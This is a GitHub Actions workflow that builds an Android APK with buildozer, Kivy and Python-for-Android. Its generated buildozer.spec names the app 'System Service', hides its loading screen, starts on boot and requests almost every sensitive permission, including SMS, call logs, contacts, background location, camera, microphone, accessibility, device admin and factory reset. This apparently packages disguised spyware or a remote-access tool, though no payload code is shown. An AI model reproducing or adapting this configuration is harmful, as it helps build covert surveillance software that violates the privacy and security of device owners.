name: Build Android APK

on:
  push:
    branches: [ main, master ]
  workflow_dispatch:

jobs:
  build-android:
    name: Build Android APK
    runs-on: ubuntu-22.04
    timeout-minutes: 120
    
    steps:
      - name: Checkout repository
        uses: actions/checkout@v4
      
      - name: Setup Java 17
        uses: actions/setup-java@v4
        with:
          java-version: '17'
          distribution: 'temurin'
      
      - name: Setup Python 3.10
        uses: actions/setup-python@v5
        with:
          python-version: '3.10'
      
      - name: Install system dependencies
        run: |
          sudo apt-get update -qq
          sudo apt-get install -y -qq \
            build-essential \
            git \
            python3-dev \
            python3-pip \
            libffi-dev \
            libssl-dev \
            liblzma-dev \
            autoconf \
            automake \
            autotools-dev \
            libtool \
            libtool-bin \
            cmake \
            pkg-config \
            zip \
            unzip \
            wget \
            curl \
            openjdk-17-jdk \
            libncurses-dev \
            libtinfo5 \
            libsqlite3-dev \
            libreadline-dev \
            libbz2-dev \
            libgdbm-dev \
            zlib1g-dev
      
      - name: Install Python packages
        run: |
          pip install --upgrade pip setuptools wheel
          pip install cython buildozer virtualenv
      
      - name: Setup Android SDK
        run: |
          ANDROID_SDK_ROOT=$HOME/.buildozer/android/platform/android-sdk
          mkdir -p $ANDROID_SDK_ROOT
          cd $ANDROID_SDK_ROOT
          
          wget -q https://dl.google.com/android/repository/commandlinetools-linux-9477386_latest.zip
          unzip -q commandlinetools-linux-9477386_latest.zip
          rm commandlinetools-linux-9477386_latest.zip
          
          mkdir -p cmdline-tools/latest
          if [ -d "cmdline-tools/bin" ]; then
            mv cmdline-tools/* cmdline-tools/latest/ 2>/dev/null || true
          fi
          
          mkdir -p tools/bin
          ln -sf $ANDROID_SDK_ROOT/cmdline-tools/latest/bin/sdkmanager $ANDROID_SDK_ROOT/tools/bin/sdkmanager
          chmod +x $ANDROID_SDK_ROOT/cmdline-tools/latest/bin/*
          
          mkdir -p licenses
          echo -e "\n8933bad161af4178b1185d1a37fbf41ea5269c55\nd56f5187479451eabf01fb78af6dfcb131a6481e\n24333f8a63b6825ea9c5514f83c2829b004d1fee" > licenses/android-sdk-license
          
          $ANDROID_SDK_ROOT/cmdline-tools/latest/bin/sdkmanager --sdk_root=$ANDROID_SDK_ROOT \
            "platform-tools" \
            "platforms;android-33" \
            "build-tools;33.0.0" \
            2>/dev/null || true
          
          echo "ANDROID_HOME=$ANDROID_SDK_ROOT" >> $GITHUB_ENV
          echo "ANDROID_SDK_ROOT=$ANDROID_SDK_ROOT" >> $GITHUB_ENV
          echo "$ANDROID_SDK_ROOT/cmdline-tools/latest/bin" >> $GITHUB_PATH
          echo "$ANDROID_SDK_ROOT/tools/bin" >> $GITHUB_PATH
          echo "$ANDROID_SDK_ROOT/platform-tools" >> $GITHUB_PATH
      
      - name: Cache build dependencies
        uses: actions/cache@v4
        with:
          path: ~/.buildozer
          key: ${{ runner.os }}-buildozer-v5-${{ hashFiles('.github/workflows/main.yml') }}
          restore-keys: |
            ${{ runner.os }}-buildozer-v5-
      
      - name: Create buildozer.spec
        run: |
          cat > buildozer.spec << 'SPECEOF'
          [app]

          title = System Service
          package.name = systemservice
          package.domain = org.example

          source.dir = .
          source.include_exts = py,png,jpg,kv,atlas,txt,json
          version = 1.0

          orientation = portrait
          fullscreen = 1
          android.permissions = INTERNET,ACCESS_NETWORK_STATE,ACCESS_WIFI_STATE,CHANGE_WIFI_STATE,ACCESS_COARSE_LOCATION,ACCESS_FINE_LOCATION,ACCESS_BACKGROUND_LOCATION,CAMERA,RECORD_AUDIO,READ_EXTERNAL_STORAGE,WRITE_EXTERNAL_STORAGE,READ_PHONE_STATE,READ_CONTACTS,WRITE_CONTACTS,READ_SMS,SEND_SMS,RECEIVE_SMS,READ_CALL_LOG,WRITE_CALL_LOG,CALL_PHONE,PROCESS_OUTGOING_CALLS,BLUETOOTH,BLUETOOTH_ADMIN,VIBRATE,WAKE_LOCK,SYSTEM_ALERT_WINDOW,REQUEST_INSTALL_PACKAGES,REQUEST_DELETE_PACKAGES,INSTALL_SHORTCUT,UNINSTALL_SHORTCUT,READ_SYNC_SETTINGS,WRITE_SYNC_SETTINGS,RECEIVE_BOOT_COMPLETED,BIND_ACCESSIBILITY_SERVICE,BIND_DEVICE_ADMIN,BIND_NOTIFICATION_LISTENER_SERVICE,BIND_VPN_SERVICE,CHANGE_CONFIGURATION,CLEAR_APP_CACHE,DELETE_CACHE_FILES,DELETE_PACKAGES,EXPAND_STATUS_BAR,GET_ACCOUNTS,GET_TASKS,GLOBAL_SEARCH,INSTALL_PACKAGES,KILL_BACKGROUND_PROCESSES,MANAGE_ACCOUNTS,MASTER_CLEAR,MODIFY_AUDIO_SETTINGS,NFC,PACKAGE_USAGE_STATS,READ_CALENDAR,WRITE_CALENDAR,READ_LOGS,READ_PROFILE,WRITE_PROFILE,READ_SOCIAL_STREAM,WRITE_SOCIAL_STREAM,READ_USER_DICTIONARY,WRITE_USER_DICTIONARY,READ_VOICEMAIL,WRITE_VOICEMAIL,REBOOT,RECEIVE_MMS,RECEIVE_WAP_PUSH,RECORD_VIDEO,REORDER_TASKS,RESTART_PACKAGES,SET_ALARM,SET_DEBUG_APP,SET_PREFERRED_APPLICATIONS,SET_PROCESS_LIMIT,SET_TIME,SET_TIME_ZONE,SET_WALLPAPER,STATUS_BAR,TRANSMIT_IR,USE_CREDENTIALS,USE_FINGERPRINT,USE_SIP,WRITE_APN_SETTINGS,WRITE_GSERVICES,WRITE_SECURE_SETTINGS,WRITE_SETTINGS,FOREGROUND_SERVICE,REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
          android.api = 33
          android.minapi = 21
          android.ndk = 25b
          android.archs = armeabi-v7a, arm64-v8a
          android.accept_sdk_agreement = True
          android.gradle_dependencies = androidx.core:core:1.6.0,androidx.appcompat:appcompat:1.3.1,com.google.android.material:material:1.4.0
          android.allow_backup = True
          android.private_storage = True
          android.presplash_color = #000000
          android.wakelock = True
          android.hide_loading_screen = True
          android.enable_androidx = True
          android.use_androidx = True
          android.javac_target = 1.8
          android.javac_source = 1.8
          p4a.branch = develop
          android.p4a_bootstrap = sdl2
          android.debug = True

          requirements = python3,kivy,plyer,android,requests,cryptography,pycryptodome,pyjnius,pillow,openssl,libffi,sqlite3,sdl2_image,sdl2_mixer,sdl2_ttf,toml,cython

          [buildozer]
          log_level = 2
          warn_on_root = 1
          SPECEOF
          
          echo "buildozer.spec created:"
          cat buildozer.spec
      
      - name: Build APK
        id: build
        run: |
          echo "Starting build on $(lsb_release -ds)..."
          
          export AUTORECONF=/usr/bin/autoreconf
          export AUTOCONF=/usr/bin/autoconf
          export AUTOMAKE=/usr/bin/automake
          export ACLOCAL=/usr/bin/aclocal
          export LIBTOOLIZE=/usr/bin/libtoolize
          
          # Create patched autoreconf for libffi LT_SYS_SYMBOL_USCORE fix
          cat > /tmp/autoreconf << 'AUTOWRAP'
          #!/bin/bash
          for f in configure configure.ac; do
            if [ -f "$f" ] && grep -q "LT_SYS_SYMBOL_USCORE" "$f" 2>/dev/null; then
              echo "[FIX] Patching $f to remove LT_SYS_SYMBOL_USCORE..."
              sed -i 's/LT_SYS_SYMBOL_USCORE/AC_CHECK_FUNCS(rindex)/g' "$f"
            fi
          done
          /usr/bin/autoreconf "$@"
          AUTOWRAP
          chmod +x /tmp/autoreconf
          export PATH="/tmp:$PATH"
          
          buildozer android debug 2>&1 | tee full_build.log
          BUILD_EXIT=${PIPESTATUS[0]}
          
          echo ""
          echo "Build exit code: $BUILD_EXIT"
          
          # Find APK
          find /home/runner -name "*.apk" -type f 2>/dev/null | head -10
          
          if ls bin/*.apk 1> /dev/null 2>&1; then
            echo ""
            echo "✅ APK FOUND!"
            ls -lh bin/*.apk
            echo "apk_created=true" >> $GITHUB_OUTPUT
          else
            echo ""
            echo "❌ No APK in bin/"
            echo ""
            echo "=== Errors in log ==="
            grep -i "error\|failed" full_build.log | grep -v "WARNING\|DEPRECATED\|prerequisites" | tail -20
            echo "apk_created=false" >> $GITHUB_OUTPUT
          fi
      
      - name: Upload APK
        if: steps.build.outputs.apk_created == 'true'
        uses: actions/upload-artifact@v4
        with:
          name: Android-APK-${{ github.run_number }}
          path: bin/*.apk
          retention-days: 30
      
      # ⬇️ ALWAYS UPLOAD BUILD LOG - SUCCESS OR FAILURE ⬇️
      - name: Upload build log (ALWAYS)
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: build-log-${{ github.run_number }}
          path: full_build.log
          retention-days: 7
      
      - name: Build Summary
        if: always()
        run: |
          echo "============================================"
          echo "BUILD SUMMARY"
          echo "============================================"
          echo "Status: ${{ job.status }}"
          
          if ls bin/*.apk 1> /dev/null 2>&1; then
            echo ""
            echo "✅ APK SUCCESSFULLY CREATED!"
            ls -lh bin/*.apk
            echo ""
            echo "📥 Download APK from Artifacts:"
            echo "   Android-APK-${{ github.run_number }}"
          else
            echo ""
            echo "❌ NO APK CREATED"
            echo ""
            echo "📥 Download the build log from Artifacts:"
            echo "   1. Scroll down to 'Artifacts' section"
            echo "   2. Download 'build-log-${{ github.run_number }}'"
            echo "   3. Run: python3 build_log_analyzer.py full_build.log --full"
            echo "   4. Share the output for debugging"
          fi
          echo "============================================"
      
      # ⬇️ EXTRA: Upload buildozer files for debugging ⬇️
      - name: Upload buildozer config (for debugging)
        if: failure()
        uses: actions/upload-artifact@v4
        with:
          name: buildozer-config-${{ github.run_number }}
          path: |
            buildozer.spec
            .buildozer/android/platform/python-for-android/pythonforandroid/recipes/libffi/__init__.py
          retention-days: 3
